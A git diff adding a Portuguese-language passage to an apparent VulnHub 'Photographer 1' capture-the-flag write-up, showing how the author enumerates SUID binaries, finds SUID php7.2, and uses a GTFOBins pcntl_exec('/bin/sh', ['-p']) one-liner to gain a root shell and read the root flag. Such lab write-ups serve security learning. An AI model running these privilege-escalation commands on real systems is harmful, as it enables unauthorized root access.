@@ -178,4 +178,37 @@ Passamos para a máquina virtual e executamos
 
 ![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/vulnhub/vulnhub-photographer1/lin2.png)
 
-![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/vulnhub/vulnhub-photographer1/lin3.png)
+Apareceu que o `php7.2` está com o `SUID` habilitado
+
+Também encontramos procurando por arquivos com SUID habilitado por esse comando
+
+```bash
+find / -perm -4000 2>/dev/null
+```
+
+![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/vulnhub/vulnhub-photographer1/ee.png)
+
+O `php2.7` está com essas permissões habilitadas, pesquisamos como explorar isso
+
+https://gtfobins.github.io/gtfobins/php/
+
+![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/vulnhub/vulnhub-photographer1/ee1.png)
+
+```
+sudo install -m =xs $(which php) .
+
+CMD="/bin/sh"
+./php -r "pcntl_exec('/bin/sh', ['-p']);"
+```
+
+Então, viramos root!
+
+```bash
+php7.2 -r "pcntl_exec('/bin/sh', ['-p']);"
+```
+
+![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/vulnhub/vulnhub-photographer1/ee2.png)
+
+Pegamos a flag de root
+
+![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/vulnhub/vulnhub-photographer1/flag1.png)
